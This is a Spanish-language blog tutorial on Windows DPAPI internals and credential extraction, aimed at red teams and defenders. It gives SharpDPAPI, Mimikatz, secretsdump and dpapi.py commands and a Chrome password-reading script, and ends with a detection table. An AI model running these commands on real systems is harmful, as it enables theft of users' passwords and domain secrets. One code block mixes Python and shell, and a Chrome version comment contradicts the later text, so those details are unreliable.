---
layout: single
title: "DPAPI: extracción offline de credenciales y secretos de Windows"
date: 2026-07-22
categories: [tutoriales, analisis]
tags: [dpapi, windows, credential-dumping, active-directory, red-team, post-explotacion]
excerpt: "Cómo funciona DPAPI por dentro, qué secretos protege y cómo extraerlos tanto en sistemas live como offline sin tocar LSASS."
permalink: /tutoriales/dpapi-extraccion-credenciales-windows/
---

DPAPI (Data Protection API) es el mecanismo que Windows usa internamente para cifrar secretos de usuario: contraseñas de Chrome, credenciales de RDP, claves WiFi, tokens de aplicaciones de terceros. Desde el punto de vista ofensivo es una mina de oro porque las claves maestras residen o bien en el disco o bien en LSASS, lo que abre dos vectores distintos. Desde el punto de vista defensivo, que las credenciales estén cifradas no significa que estén a salvo si el atacante ya tiene acceso al sistema o al dominio.

## Arquitectura de DPAPI

DPAPI expone dos funciones públicas: `CryptProtectData` y `CryptUnprotectData`. Por debajo el modelo es más complejo.

```
Dato en claro
    │
    ▼
CryptProtectData()
    │
    ├── Genera AES-256 aleatorio (session key)
    ├── Cifra el dato con session key
    └── Cifra la session key con una Master Key
           │
           └── Master Key cifrada con:
                   ├── SHA-1 del password del usuario (modo usuario)
                   └── clave de dominio vía MS-BKRP (modo dominio)
```

El resultado es un **DPAPI BLOB**, una estructura binaria que contiene:
- GUID de la Master Key usada
- Datos de entropía opcionales (`pOptionalEntropy`)
- IV y datos cifrados

Las Master Keys están en:

```
%APPDATA%\Microsoft\Protect\<SID>\<GUID>
```

Y hay una por cada clave maestra que el sistema ha generado (se rotan cada 90 días por defecto). El `GUID` dentro del BLOB apunta a la Master Key concreta que hay que descifrar primero.

### DPAPI en entorno de dominio

Cuando el sistema está unido a un dominio, las Master Keys se pueden descifrar de dos formas:
1. Con el password del usuario (modo offline)
2. Con la **DPAPI Domain Backup Key** almacenada en el DC (protocolo MS-BKRP)

Esto significa que un Domain Admin puede descifrar cualquier BLOB DPAPI de cualquier usuario del dominio sin conocer su contraseña — sólo necesita la backup key.

## Qué protege DPAPI

| Aplicación / componente | Ruta / descripción |
|---|---|
| Chrome / Chromium passwords | `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data` |
| Chrome cookies | `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies` |
| Credenciales RDP (MSTSC) | `%APPDATA%\Microsoft\Credentials\` |
| Windows Credential Manager | `%APPDATA%\Microsoft\Credentials\` y `%LOCALAPPDATA%\Microsoft\Credentials\` |
| Clave privada Wi-Fi (algunos escenarios) | DPAPI via `wlanapi.dll` |
| Tokens de Outlook, Teams, Edge | `%APPDATA%\Microsoft\` |
| Secretos de tareas programadas | `%SystemRoot%\System32\Tasks\` (campos `RunAs`) |
| DPAPI-NG (Windows 10+) | BLOBs con SID-based descriptors, usados por CNG |

## Extracción en sistema live (sin LSASS)

El escenario más limpio: tenemos una sesión con los privilegios del usuario objetivo (o SYSTEM).

### SharpDPAPI

[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) de GhostPack es la herramienta de referencia. Puede operar completamente desde userland.

**Dump de Master Keys propias (usuario actual):**

```cmd
SharpDPAPI.exe masterkeys
```

Esto pide las Master Keys del usuario actual; si tenemos su contraseña o token de sesión, las descifra:

```cmd
SharpDPAPI.exe masterkeys /password:P@ssw0rd!
```

**Dump de credenciales del Credential Manager:**

```cmd
SharpDPAPI.exe credentials
```

**Dump de contraseñas de Chrome:**

```cmd
SharpDPAPI.exe logins
```

**Con SYSTEM, vía MS-BKRP (solicita la backup key al DC):**

```cmd
SharpDPAPI.exe masterkeys /rpc
```

Esto usa el protocolo Backup Key Remote Protocol para obtener la DPAPI Domain Backup Key directamente del DC y descifrar todas las Master Keys del dominio.

### Mimikatz

```
sekurlsa::dpapi
```

Extrae Master Keys en memoria desde LSASS. Más ruidoso que SharpDPAPI pero efectivo.

```
dpapi::chrome /in:"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data"
```

Descifra el fichero SQLite de Chrome directamente, usando las Master Keys que ya tiene en caché.

## Extracción offline

El escenario más interesante: tenemos volcado del disco (imagen forense, VSS, backup) pero no sesión activa en la máquina.

### Paso 1 — Obtener la DPAPI Domain Backup Key

Si el objetivo está en un dominio, la backup key lo desbloquea todo. Se puede extraer con Domain Admin:

```cmd
SharpDPAPI.exe backupkey /nowrap
```

O desde un DC comprometido:

```python
from impacket.dpapi import DPAPI_DOMAIN_BACKUPKEY
from impacket.examples.secretsdump import RemoteOperations

# También funciona con secretsdump directamente
python3 secretsdump.py DOMINIO/Administrador:password@10.10.10.10 -just-dc-key
```

La backup key se exporta como PEM (clave RSA-2048):

```
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA...
-----END RSA PRIVATE KEY-----
```

### Paso 2 — Descifrar Master Keys offline

Con la backup key y los ficheros de Master Key del usuario:

```cmd
SharpDPAPI.exe masterkeys /pvk:backupkey.pvk
```

O con `dpapi.py` de Impacket:

```bash
python3 dpapi.py masterkey \
  -file "/ruta/a/%APPDATA%/Microsoft/Protect/S-1-5-21-xxx/GUID" \
  -pvk backupkey.pvk
```

Salida:
```
[DPAPI] MasterKey: aabbccdd...  (clave de 64 bytes en hex)
```

### Paso 3 — Descifrar BLOBs individuales

Con la Master Key descifrada podemos atacar cualquier BLOB:

**Credential files:**

```bash
python3 dpapi.py credential \
  -file "/ruta/a/%APPDATA%/Microsoft/Credentials/GUID" \
  -key aabbccdd...
```

**Chrome Login Data:**

```bash
python3 dpapi.py blob \
  -unprotect \
  -masterkey aabbccdd... \
  -in encrypted_password.bin
```

Para Chrome hay que extraer primero el BLOB cifrado del SQLite:

```python
import sqlite3, base64

conn = sqlite3.connect("Login Data")
cursor = conn.cursor()
cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
for row in cursor.fetchall():
    url, user, enc_pass = row
    # enc_pass empieza con b"v10" en Chrome >= 80 (App-Bound Key)
    # o directamente con el BLOB DPAPI en versiones anteriores
    print(url, user, base64.b64encode(enc_pass).decode())
```

### Chrome App-Bound Encryption (v127+)

A partir de Chrome 127, Google introdujo **App-Bound Encryption**: la clave AES que cifra los passwords ya no está protegida únicamente con DPAPI de usuario sino con un DPAPI de SYSTEM más una verificación de identidad del proceso. Esto rompe los métodos anteriores para Chrome moderno.

El BLOB ahora empieza con `v20` en lugar de `v10`. La clave AES está en `Local State` cifrada con DPAPI de SYSTEM:

```bash
python3 dpapi.py blob \
  -masterkey <SYSTEM_masterkey> \
  -in app_bound_key.bin
```

Hay que tener la Master Key de SYSTEM (requiere volcado de `C:\Windows\System32\Microsoft\Protect\S-1-5-18\`), que a su vez requiere el hash de la cuenta SYSTEM — que no tiene password en el sentido tradicional, sino que se genera desde el secreto LSA.

```cmd
SharpDPAPI.exe masterkeys /system
```

Requiere privilegios SYSTEM en el sistema live, o el secreto LSA extraído offline desde el registro (`HKLM\SECURITY\Policy\Secrets`).

## Secreto LSA — el pivote para DPAPI de SYSTEM

Los secretos LSA incluyen la clave DPAPI_SYSTEM, que cifra las Master Keys de la cuenta SYSTEM:

```bash
python3 secretsdump.py -system SYSTEM.hive -security SECURITY.hive LOCAL
```

Salida relevante:
```
[*] Decrypting LSA Secrets
$MACHINE.ACC: ...
DPAPI_SYSTEM: 0x01  <user_key_hex>  <machine_key_hex>
```

Con `DPAPI_SYSTEM` se pueden descifrar las Master Keys de SYSTEM offline:

```bash
python3 dpapi.py masterkey \
  -file "S-1-5-18/GUID" \
  -key <dpapi_system_user_key>
```

## Detección

| Indicador | Fuente |
|---|---|
| `CryptUnprotectData` llamado desde proceso no habitual | API monitoring (EDR) |
| Acceso a `%APPDATA%\Microsoft\Protect\` desde proceso sospechoso | Sysmon Event ID 11 |
| Solicitud MS-BKRP al DC (`ncacn_ip_tcp`, puerto 49152+) | Network capture / DC Event 4662 |
| `SharpDPAPI.exe` en disco | AV / hash blocklist |
| Volcado de `Login Data` de Chrome fuera del proceso Chrome | File access monitoring |

## Referencias

- [DPAPI internals — Passcape](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28)
- [GhostPack/SharpDPAPI](https://github.com/GhostPack/SharpDPAPI)
- [Impacket dpapi.py](https://github.com/fortra/impacket/blob/master/examples/dpapi.py)
- [Chrome App-Bound Encryption — Chromium blog](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [MS-BKRP specification — Microsoft](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-bkrp)
